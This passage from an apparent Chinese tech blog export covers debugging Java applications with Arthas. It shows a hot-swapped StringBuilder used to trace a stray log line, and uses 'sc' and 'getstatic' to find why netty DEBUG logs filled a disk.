<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ jad Test$$Lambda$<span class="number">1</span>/<span class="number">1406718218</span></span><br><span class="line"></span><br><span class="line">ClassLoader:</span><br><span class="line">+-sun.misc.Launcher$AppClassLoader@<span class="number">5</span>c647e05</span><br><span class="line">  +-sun.misc.Launcher$ExtClassLoader@<span class="number">3</span>c1491ce</span><br><span class="line"></span><br><span class="line">Location:</span><br><span class="line">/tmp/classes</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Decompiled with CFR 0_132.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * Could not load the following classes:</span></span><br><span class="line"><span class="comment"> *  Test</span></span><br><span class="line"><span class="comment"> *  Test$$Lambda$1</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">import</span> java.lang.invoke.LambdaForm;</span><br><span class="line"><span class="keyword">import</span> java.util.function.Consumer;</span><br><span class="line"></span><br><span class="line"><span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Test</span>$$<span class="title">Lambda</span>$1</span></span><br><span class="line"><span class="class"><span class="keyword">implements</span> <span class="title">Consumer</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> Test$$Lambda$<span class="number">1</span>() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@LambdaForm</span>.Hidden</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">accept</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">        Test.lambda$<span class="number">0</span>((Integer)((Integer)object));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="更好的tab自动补全"><a href="#更好的tab自动补全" class="headerlink" title="更好的tab自动补全"></a>更好的tab自动补全</h3><p>改进了很多命令的<code>tab</code>自动补全功能，有停顿时，可以多按<code>tab</code>尝试下。</p>
<h3 id="Release-Note"><a href="#Release-Note" class="headerlink" title="Release Note"></a>Release Note</h3><p>详细的Release Note：<a href="https://github.com/alibaba/arthas/releases/tag/arthas-all-3.0.5" target="_blank" rel="noopener">https://github.com/alibaba/arthas/releases/tag/arthas-all-3.0.5</a></p>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas实践--使用redefine排查应用奇怪的日志来源</title>
    <url>/arthas-redefine-case/</url>
    <content><![CDATA[<h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>随着应用越来越复杂，依赖越来越多，日志系统越来越混乱，有时会出现一些奇怪的日志，比如：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[] [] [] No credential found</span><br></pre></td></tr></table></figure>
<p>那么怎样排查这些奇怪的日志从哪里打印出来的呢？因为搞不清楚是什么logger打印出来的，所以想定位就比较头疼。</p>
<p>下面介绍用Alibaba开源的应用诊断利器Arthas的redefine命令快速定位奇怪日志来源。</p>
<ul>
<li>Arthas: <a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
<li>redefine命令：<a href="https://alibaba.github.io/arthas/redefine.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/redefine.html</a></li>
</ul>
<h2 id="修改StringBuilder"><a href="#修改StringBuilder" class="headerlink" title="修改StringBuilder"></a>修改StringBuilder</h2><p>首先在java代码里，字符串拼接基本都是通过<code>StringBuilder</code>来实现的。比如下面的代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">hello</span><span class="params">(String world)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">"hello "</span> + world;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>实际上生成的字节码也是用<code>StringBuilder</code>来拼接的：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> java.lang.<span class="function">String <span class="title">hello</span><span class="params">(java.lang.String)</span></span>;</span><br><span class="line">  descriptor: (Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line">  flags: ACC_PUBLIC, ACC_STATIC</span><br><span class="line">  Code:</span><br><span class="line">    stack=<span class="number">3</span>, locals=<span class="number">1</span>, args_size=<span class="number">1</span></span><br><span class="line">       0: new           #22                 // class java/lang/StringBuilder</span><br><span class="line">       <span class="number">3</span>: dup</span><br><span class="line">       4: ldc           #24                 // String hello</span><br><span class="line">       6: invokespecial #26                 // Method java/lang/StringBuilder."&lt;init&gt;":(Ljava/lang/String;)V</span><br><span class="line">       <span class="number">9</span>: aload_0</span><br><span class="line">      10: invokevirtual #29                 // Method java/lang/StringBuilder.append:(Ljava/lang/String;)Ljava/lang/StringBuilder;</span><br><span class="line">      13: invokevirtual #33                 // Method java/lang/StringBuilder.toString:()Ljava/lang/String;</span><br><span class="line">      <span class="number">16</span>: areturn</span><br></pre></td></tr></table></figure>
<p>在java的logger系统里，输出日志时通常也是<code>StringBuilder</code>来实现的，最终会调用<code>StringBuilder.toString()</code>，那么我们可以修改<code>StringBuilder</code>的代码来检测到日志来源。</p>
<p><code>StringBuilder.toString()</code> 的原生实现是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Create a copy, don't share the array</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> String(value, <span class="number">0</span>, count);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>修改为：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// Create a copy, don't share the array</span></span><br><span class="line">	String result = <span class="keyword">new</span> String(value, <span class="number">0</span>, count);</span><br><span class="line">	<span class="keyword">if</span>(result.contains(<span class="string">"No credential found"</span>)) &#123;</span><br><span class="line">		System.err.println(result);</span><br><span class="line">		<span class="keyword">new</span> Throwable().printStackTrace();</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>增加的逻辑是：<strong>当String里包含<code>No credential found</code>时打印出当前栈，这样子就可以定位日志输出来源了。</strong></p>
<h2 id="编绎修改过的StringBuilder"><a href="#编绎修改过的StringBuilder" class="headerlink" title="编绎修改过的StringBuilder"></a>编绎修改过的StringBuilder</h2><p>其实很简单，在IDE里把<code>StringBuilder</code>的代码复制一份，然后贴到任意一个工程里，然后编绎即可。</p>
<p>也可以直接用javac来编绎：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">javac StringBuilder.java</span><br></pre></td></tr></table></figure>
<h2 id="启动应用，使用Arthas-redefine修改过的StringBuilder"><a href="#启动应用，使用Arthas-redefine修改过的StringBuilder" class="headerlink" title="启动应用，使用Arthas redefine修改过的StringBuilder"></a>启动应用，使用Arthas redefine修改过的StringBuilder</h2><p>启动应用后，在奇怪日志输出之前，先使用arthas attach应用，再redefine StringBuilder:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ redefine -p /tmp/StringBuilder.class</span><br><span class="line">redefine success, size: 1</span><br></pre></td></tr></table></figure>
<p>当执行到输出<code>[] [] [] No credential found</code>的logger代码时，会打印当前栈。实际运行结果是：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">[] [] [] No credential found</span><br><span class="line">java.lang.Throwable</span><br><span class="line">	at java.lang.StringBuilder.toString(StringBuilder.java:<span class="number">410</span>)</span><br><span class="line">	at com.taobao.middleware.logger.util.MessageUtil.getMessage(MessageUtil.java:<span class="number">26</span>)</span><br><span class="line">	at com.taobao.middleware.logger.util.MessageUtil.getMessage(MessageUtil.java:<span class="number">15</span>)</span><br><span class="line">	at com.taobao.middleware.logger.slf4j.Slf4jLogger.info(Slf4jLogger.java:<span class="number">77</span>)</span><br><span class="line">	at com.taobao.spas.sdk.common.log.SpasLogger.info(SpasLogger.java:<span class="number">18</span>)</span><br><span class="line">	at com.taobao.spas.sdk.client.identity.CredentialWatcher.loadCredential(CredentialWatcher.java:<span class="number">128</span>)</span><br><span class="line">	at com.taobao.spas.sdk.client.identity.CredentialWatcher.access$<span class="number">200</span>(CredentialWatcher.java:<span class="number">18</span>)</span><br><span class="line">	at com.taobao.spas.sdk.client.identity.CredentialWatcher$<span class="number">1</span>.run(CredentialWatcher.java:<span class="number">58</span>)</span><br><span class="line">	at java.util.TimerThread.mainLoop(Timer.java:<span class="number">555</span>)</span><br><span class="line">	at java.util.TimerThread.run(Timer.java:<span class="number">505</span>)</span><br></pre></td></tr></table></figure>
<p><strong>可以看到是<code>spas.sdk</code>打印出了<code>[] [] [] No credential found</code>的日志。</strong></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>logger最终会用StringBuilder来输出</li>
<li>修改StringBuilder来定位输出特定日志的地方</li>
<li>使用Arthas redefine命令来加载修改过的StringBuilder</li>
<li>redefine命令实际上实现了任意代码线上debug的功能，可以随意本地修改代码重新编绎，然后线上redefine加载</li>
<li>redefine的功能过于强大，所以请小心使用:)</li>
</ul>
<h2 id="Arthas实践系列"><a href="#Arthas实践系列" class="headerlink" title="Arthas实践系列"></a>Arthas实践系列</h2><ul>
<li><a href="/arthas-logger-problem/">使用Arthas抽丝剥茧排查线上应用日志打满问题</a></li>
<li><a href="/spring-boot-arthas-NoSuchMethodError/">深入Spring Boot：利用Arthas排查NoSuchMethodError</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>logger</tag>
        <tag>redefine</tag>
      </tags>
  </entry>
  <entry>
    <title>Arthas实践--抽丝剥茧排查线上应用日志打满问题</title>
    <url>/arthas-logger-problem/</url>
    <content><![CDATA[<h2 id="现象"><a href="#现象" class="headerlink" title="现象"></a>现象</h2><p>在应用的 <code>service_stdout.log</code>里一直输出下面的日志，直接把磁盘打满了：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">23:07:34.441 [TAIRCLIENT-1-thread-1] DEBUG io.netty.channel.nio.NioEventLoop - Selector.select() returned prematurely 14 times in a row.</span><br><span class="line">23:07:34.460 [TAIRCLIENT-1-thread-3] DEBUG io.netty.channel.nio.NioEventLoop - Selector.select() returned prematurely 3 times in a row.</span><br><span class="line">23:07:34.461 [TAIRCLIENT-1-thread-4] DEBUG io.netty.channel.nio.NioEventLoop - Selector.select() returned prematurely 3 times in a row.</span><br><span class="line">23:07:34.462 [TAIRCLIENT-1-thread-5] DEBUG io.netty.channel.nio.NioEventLoop - Selector.select() returned prematurely 3 times in a row.</span><br></pre></td></tr></table></figure>
<p> <code>service_stdout.log</code>是进程标准输出的重定向，可以初步判定是tair插件把日志输出到了stdout里。</p>
<p>尽管有了初步的判断，但是具体logger为什么会打到stdout里，还需要进一步排查，常见的方法可能是本地debug。</p>
<p>下面介绍利用arthas直接在线上定位问题的过程，主要使用<code>sc</code>和<code>getstatic</code>命令。</p>
<ul>
<li><a href="https://alibaba.github.io/arthas/sc.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/sc.html</a></li>
<li><a href="https://alibaba.github.io/arthas/getstatic.html" target="_blank" rel="noopener">https://alibaba.github.io/arthas/getstatic.html</a></li>
</ul>
<h2 id="定位logger的具体实现"><a href="#定位logger的具体实现" class="headerlink" title="定位logger的具体实现"></a>定位logger的具体实现</h2><p>日志是<code>io.netty.channel.nio.NioEventLoop</code>输出的，到netty的代码里查看，发现是DEBUG级别的输出：</p>
<ul>
<li><a href="https://github.com/netty/netty/blob/netty-4.0.35.Final/transport/src/main/java/io/netty/channel/nio/NioEventLoop.java#L673" target="_blank" rel="noopener">https://github.com/netty/netty/blob/netty-4.0.35.Final/transport/src/main/java/io/netty/channel/nio/NioEventLoop.java#L673</a></li>
</ul>
<p>然后用arthas的<code>sc</code>命令来查看具体的<code>io.netty.channel.nio.NioEventLoop</code>是从哪里加载的。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span>-<span class="title">info</span>        <span class="title">io</span>.<span class="title">netty</span>.<span class="title">channel</span>.<span class="title">nio</span>.<span class="title">NioEventLoop</span></span></span><br><span class="line"> code-source       file:/opt/app/plugins/tair-plugin/lib/netty-all-4.0.35.Final.jar!/</span><br><span class="line"> name              io.netty.channel.nio.NioEventLoop</span><br><span class="line"> isInterface       <span class="keyword">false</span></span><br><span class="line"> isAnnotation      <span class="keyword">false</span></span><br><span class="line"> isEnum            <span class="keyword">false</span></span><br><span class="line"> isAnonymousClass  <span class="keyword">false</span></span><br><span class="line"> isArray           <span class="keyword">false</span></span><br><span class="line"> isLocalClass      <span class="keyword">false</span></span><br><span class="line"> isMemberClass     <span class="keyword">false</span></span><br><span class="line"> isPrimitive       <span class="keyword">false</span></span><br><span class="line"> isSynthetic       <span class="keyword">false</span></span><br><span class="line"> simple-name       NioEventLoop</span><br><span class="line"> modifier          <span class="keyword">final</span>,<span class="keyword">public</span></span><br><span class="line"> annotation</span><br><span class="line"> interfaces</span><br><span class="line"> <span class="keyword">super</span>-<span class="class"><span class="keyword">class</span>       +-<span class="title">io</span>.<span class="title">netty</span>.<span class="title">channel</span>.<span class="title">SingleThreadEventLoop</span></span></span><br><span class="line"><span class="class">                     +-<span class="title">io</span>.<span class="title">netty</span>.<span class="title">util</span>.<span class="title">concurrent</span>.<span class="title">SingleThreadEventExecutor</span></span></span><br><span class="line"><span class="class">                       +-<span class="title">io</span>.<span class="title">netty</span>.<span class="title">util</span>.<span class="title">concurrent</span>.<span class="title">AbstractScheduledEventExecutor</span></span></span><br><span class="line"><span class="class">                         +-<span class="title">io</span>.<span class="title">netty</span>.<span class="title">util</span>.<span class="title">concurrent</span>.<span class="title">AbstractEventExecutor</span></span></span><br><span class="line"><span class="class">                           +-<span class="title">java</span>.<span class="title">util</span>.<span class="title">concurrent</span>.<span class="title">AbstractExecutorService</span></span></span><br><span class="line"><span class="class">                             +-<span class="title">java</span>.<span class="title">lang</span>.<span class="title">Object</span></span></span><br><span class="line"><span class="class"> <span class="title">class</span>-<span class="title">loader</span>      +-<span class="title">tair</span>-<span class="title">plugin</span>'<span class="title">s</span> <span class="title">ModuleClassLoader</span></span></span><br><span class="line"><span class="class"> <span class="title">classLoaderHash</span>   73<span class="title">ad2d6</span></span></span><br></pre></td></tr></table></figure>
<p>可见，的确是从tair插件里加载的。</p>
<p>查看NioEventLoop的代码，可以发现它有一个<code>logger</code>的field：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">NioEventLoop</span> <span class="keyword">extends</span> <span class="title">SingleThreadEventLoop</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> InternalLogger logger = InternalLoggerFactory.getInstance(NioEventLoop<span class="class">.<span class="keyword">class</span>)</span>;</span><br></pre></td></tr></table></figure>
<p>使用arthas的<code>getstatic</code>命令来查看这个<code>logger</code>具体实现类是什么（使用<code>-c</code>参数指定classloader）：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ getstatic -c 73ad2d6 io.netty.channel.nio.NioEventLoop logger &apos;getClass().getName()&apos;</span><br><span class="line">field: logger</span><br><span class="line">@String[io.netty.util.internal.logging.Slf4JLogger]</span><br></pre></td></tr></table></figure>
<p>可以发现是<code>Slf4JLogger</code>。 </p>
<p>再查看io.netty.util.internal.logging.Slf4JLogger的实现，发现它内部有一个logger的field：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> io.netty.util.internal.logging;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.slf4j.Logger;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * &lt;a href="http://www.slf4j.org/"&gt;SLF4J&lt;/a&gt; logger.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slf4JLogger</span> <span class="keyword">extends</span> <span class="title">AbstractInternalLogger</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">108038972685130825L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="keyword">transient</span> Logger logger;</span><br></pre></td></tr></table></figure>
<p>那么使用arthas的<code>getstatic</code>命令来查看这个<code>logger</code>属性的值：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ getstatic -c <span class="number">73</span>ad2d6 io.netty.channel.nio.NioEventLoop logger <span class="string">'logger'</span></span><br><span class="line">field: logger</span><br><span class="line"><span class="meta">@Logger</span>[</span><br><span class="line">    serialVersionUID=<span class="meta">@Long</span>[<span class="number">5454405123156820674</span>],</span><br><span class="line">    FQCN=<span class="meta">@String</span>[ch.qos.logback.classic.Logger],</span><br><span class="line">    name=<span class="meta">@String</span>[io.netty.channel.nio.NioEventLoop],</span><br><span class="line">    level=<span class="keyword">null</span>,</span><br><span class="line">    effectiveLevelInt=<span class="meta">@Integer</span>[<span class="number">10000</span>],</span><br><span class="line">    parent=<span class="meta">@Logger</span>[Logger[io.netty.channel.nio]],</span><br><span class="line">    childrenList=<span class="keyword">null</span>,</span><br><span class="line">    aai=<span class="keyword">null</span>,</span><br><span class="line">    additive=<span class="meta">@Boolean</span>[<span class="keyword">true</span>],</span><br><span class="line">    loggerContext=<span class="meta">@LoggerContext</span>[ch.qos.logback.classic.LoggerContext[<span class="keyword">default</span>]],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>可见，logger的最本质实现类是：<code>ch.qos.logback.classic.Logger</code>。</p>
<p>再次用<code>getstatic</code>命令来确定jar包的location：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ getstatic -c <span class="number">73</span>ad2d6 io.netty.channel.nio.NioEventLoop logger <span class="string">'logger.getClass().getProtectionDomain().getCodeSource().getLocation()'</span></span><br><span class="line">field: logger</span><br><span class="line"><span class="meta">@URL</span>[</span><br><span class="line">    BUILTIN_HANDLERS_PREFIX=<span class="meta">@String</span>[sun.net.www.protocol],</span><br><span class="line">    serialVersionUID=<span class="meta">@Long</span>[-<span class="number">7627629688361524110</span>],</span><br><span class="line">    protocolPathProp=<span class="meta">@String</span>[java.protocol.handler.pkgs],</span><br><span class="line">    protocol=<span class="meta">@String</span>[jar],</span><br><span class="line">    host=<span class="meta">@String</span>[],</span><br><span class="line">    port=<span class="meta">@Integer</span>[-<span class="number">1</span>],</span><br><span class="line">    file=<span class="meta">@String</span>[file:/opt/app/plugins/tair-plugin/lib/logback-classic-<span class="number">1.2</span><span class="number">.3</span>.jar!/],</span><br><span class="line">    query=<span class="keyword">null</span>,</span><br><span class="line">    authority=<span class="meta">@String</span>[],</span><br><span class="line">    path=<span class="meta">@String</span>[file:/opt/app/plugins/tair-plugin/lib/logback-classic-<span class="number">1.2</span><span class="number">.3</span>.jar!/],</span><br><span class="line">    userInfo=<span class="keyword">null</span>,</span><br><span class="line">    ref=<span class="keyword">null</span>,</span><br><span class="line">    hostAddress=<span class="keyword">null</span>,</span><br><span class="line">    handler=<span class="meta">@Handler</span>[com.taobao.pandora.loader.jar.Handler@<span class="number">1</span>a0c361e],</span><br><span class="line">    hashCode=<span class="meta">@Integer</span>[<span class="number">126346621</span>],</span><br><span class="line">    tempState=<span class="keyword">null</span>,</span><br><span class="line">    factory=<span class="meta">@TomcatURLStreamHandlerFactory</span>[org.apache.catalina.webresources.TomcatURLStreamHandlerFactory@<span class="number">3</span>edd7b7],</span><br><span class="line">    handlers=<span class="meta">@Hashtable</span>[isEmpty=<span class="keyword">false</span>;size=<span class="number">4</span>],</span><br><span class="line">    streamHandlerLock=<span class="meta">@Object</span>[java.lang.Object@<span class="number">488</span>ccac9],</span><br><span class="line">    serialPersistentFields=<span class="meta">@ObjectStreamField</span>[][isEmpty=<span class="keyword">false</span>;size=<span class="number">7</span>],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>可见这个<code>ch.qos.logback.classic.Logger</code>的确是tair插件里加载的。</p>
<h2 id="定位logger的level"><a href="#定位logger的level" class="headerlink" title="定位logger的level"></a>定位logger的level</h2><p>上面已经定位logger的实现类是<code>ch.qos.logback.classic.Logger</code>，但是为什么它会输出<code>DEBUG</code> level的日志？</p>
<p>其实在上面的<code>getstatic -c 73ad2d6 io.netty.channel.nio.NioEventLoop logger &#39;logger&#39;</code>输出里，已经打印出它的level是null了。如果对logger有所了解的话，可以知道当child logger的level为null时，它的level取决于parent logger的level。</p>
<p>我们再来看下<code>ch.qos.logback.classic.Logger</code>的代码，它有一个parent logger的属性：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Logger</span> <span class="keyword">implements</span> <span class="title">org</span>.<span class="title">slf4j</span>.<span class="title">Logger</span>, <span class="title">LocationAwareLogger</span>, <span class="title">AppenderAttachable</span>&lt;<span class="title">ILoggingEvent</span>&gt;, <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * The parent of this category. All categories have at least one ancestor</span></span><br><span class="line"><span class="comment">     * which is the root category.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">transient</span> <span class="keyword">private</span> Logger parent;</span><br></pre></td></tr></table></figure>
<p>所以，我们可以通过<code>getstatic</code>来获取到这个parent属性的内容。然后通过多个parent操作，可以发现level都是null，最终发现ROOT level是DEBUG 。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">$ getstatic -c <span class="number">73</span>ad2d6 io.netty.channel.nio.NioEventLoop logger <span class="string">'logger.parent.parent.parent.parent.parent'</span></span><br><span class="line">field: logger</span><br><span class="line"><span class="meta">@Logger</span>[</span><br><span class="line">    serialVersionUID=<span class="meta">@Long</span>[<span class="number">5454405123156820674</span>],</span><br><span class="line">    FQCN=<span class="meta">@String</span>[ch.qos.logback.classic.Logger],</span><br><span class="line">    name=<span class="meta">@String</span>[ROOT],</span><br><span class="line">    level=<span class="meta">@Level</span>[DEBUG],</span><br><span class="line">    effectiveLevelInt=<span class="meta">@Integer</span>[<span class="number">10000</span>],</span><br><span class="line">    parent=<span class="keyword">null</span>,</span><br><span class="line">    childrenList=<span class="meta">@CopyOnWriteArrayList</span>[isEmpty=<span class="keyword">false</span>;size=<span class="number">2</span>],</span><br><span class="line">    aai=<span class="meta">@AppenderAttachableImpl</span>[ch.qos.logback.core.spi.AppenderAttachableImpl@<span class="number">1</span>ecf9bae],</span><br><span class="line">    additive=<span class="meta">@Boolean</span>[<span class="keyword">true</span>],</span><br><span class="line">    loggerContext=<span class="meta">@LoggerContext</span>[ch.qos.logback.classic.LoggerContext[<span class="keyword">default</span>]],</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>所以 <code>io.netty.channel.nio.NioEventLoop</code>的logger的level取的是ROOT logger的配置，即默认值<code>DEBUG</code>。</p>
<p>具体实现可以查看<code>ch.qos.logback.classic.LoggerContext</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">LoggerContext</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    <span class="keyword">this</span>.loggerCache = <span class="keyword">new</span> ConcurrentHashMap&lt;String, Logger&gt;();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">this</span>.loggerContextRemoteView = <span class="keyword">new</span> LoggerContextVO(<span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.root = <span class="keyword">new</span> Logger(Logger.ROOT_LOGGER_NAME, <span class="keyword">null</span>, <span class="keyword">this</span>);</span><br><span class="line">    <span class="keyword">this</span>.root.setLevel(Level.DEBUG);</span><br><span class="line">    loggerCache.put(Logger.ROOT_LOGGER_NAME, root);</span><br><span class="line">    initEvaluatorMap();</span><br><span class="line">    size = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">this</span>.frameworkPackages = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="为什么logback输出到了stdout里"><a href="#为什么logback输出到了stdout里" class="headerlink" title="为什么logback输出到了stdout里"></a>为什么logback输出到了stdout里</h2><p>上面我们得到结论</p>
<ul>
<li>tair插件里的logback默认的level是DEBUG，导致netty里的日志可以被打印出来</li>
</ul>
<p>那么我们可以猜测：</p>
<ul>
<li>tair里的logback没有特殊配置，或者只配置了tair自己的package，导致ROOT logger的日志直接输出到stdout里</li>
</ul>
<p>那么实现上tair里是使用了<code>logger-api</code>，它通过<code>LoggerFactory.getLogger</code>函数获取到了自己package的logger，然后设置level为<code>INFO</code>，并设置了appender。</p>
<p><strong>换而言之，tair插件里的logback没有设置ROOT logger，所以它的默认level是DEBUG，并且默认的appender会输出到stdout里。</strong></p>
<p>所以tair插件可以增加设置ROOT logger level为<code>INFO</code>来修复这个问题。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> com.taobao.middleware.logger.Logger logger</span><br><span class="line">			= com.taobao.middleware.logger.LoggerFactory.getLogger(<span class="string">"com.taobao.tair"</span>);</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> com.taobao.middleware.logger.Logger infolog</span><br><span class="line">			= com.taobao.middleware.logger.LoggerFactory.getLogger(<span class="string">"com.taobao.tair.custom-infolog"</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> JM_LOG_RETAIN_COUNT = <span class="number">3</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="keyword">static</span> String JM_LOG_FILE_SIZE = <span class="string">"200MB"</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">static</span> &#123;</span><br><span class="line">		<span class="keyword">try</span> &#123;</span><br><span class="line">			String tmp = System.getProperty(<span class="string">"JM.LOG.RETAIN.COUNT"</span>, <span class="string">"3"</span>);</span><br><span class="line">			JM_LOG_RETAIN_COUNT = Integer.parseInt(tmp);</span><br><span class="line">		&#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">		&#125;</span><br><span class="line">		JM_LOG_FILE_SIZE = System.getProperty(<span class="string">"JM.LOG.FILE.SIZE"</span>, <span class="string">"200MB"</span>);</span><br><span class="line"></span><br><span class="line">		logger.setLevel(Level.INFO);</span><br><span class="line">		logger.activateAppenderWithSizeRolling(<span class="string">"tair-client"</span>, <span class="string">"tair-client.log"</span>, <span class="string">"UTF-8"</span>,</span><br><span class="line">				TairUtil.splitSize(JM_LOG_FILE_SIZE, <span class="number">0.8</span> / (JM_LOG_RETAIN_COUNT + <span class="number">1</span>)), JM_LOG_RETAIN_COUNT);</span><br><span class="line">		logger.setAdditivity(<span class="keyword">false</span>);</span><br><span class="line">		logger.activateAsync(<span class="number">500</span>, <span class="number">100</span>);</span><br><span class="line"></span><br><span class="line">		logger.info(<span class="string">"JM_LOG_RETAIN_COUNT "</span> + JM_LOG_RETAIN_COUNT + <span class="string">" JM_LOG_FILE_SIZE "</span> + JM_LOG_FILE_SIZE);</span><br><span class="line"></span><br><span class="line">		infolog.setLevel(Level.INFO);</span><br><span class="line">		infolog.activateAppenderWithSizeRolling(<span class="string">"tair-client"</span>, <span class="string">"tair-client-info.log"</span>, <span class="string">"UTF-8"</span>, <span class="string">"10MB"</span>, <span class="number">1</span>);</span><br><span class="line">		infolog.setAdditivity(<span class="keyword">false</span>);</span><br><span class="line">		infolog.activateAsync(<span class="number">500</span>, <span class="number">100</span>);</span><br></pre></td></tr></table></figure>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ul>
<li>tair插件里直接以api的方式设置了自己package下的logger</li>
<li>tair插件里netty的logger的packge和tair并不一样，所以它最终取的是ROOT logger的配置</li>
<li>logback默认的ROOT logger level是<code>DEBUG</code>，输出是stdout</li>
<li>利用arthas的<code>sc</code>命令定位具体的类</li>
<li>利用arthas的<code>getstatic</code>获取static filed的值</li>
<li>利用logger parent层联的特性，可以向上一层层获取到ROOT logger的配置</li>
</ul>
<h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><ul>
<li>Arthas开源：<a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">https://github.com/alibaba/arthas</a></li>
</ul>
]]></content>
      <categories>
        <category>技术</category>
      </categories>
      <tags>
        <tag>java</tag>
        <tag>arthas</tag>
        <tag>logger</tag>
        <tag>classloader</tag>
      </tags>
  </entry>
  <entry>
    <title>深入Spring Boot：利用Arthas排查NoSuchMethodError</title>
    <url>/spring-boot-arthas-NoSuchMethodError/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>有时spring boot应用会遇到<code>java.lang.NoSuchMethodError</code>的问题，下面以具体的demo来说明怎样利用<a href="https://github.com/alibaba/arthas" target="_blank" rel="noopener">arthas</a>来排查。</p>
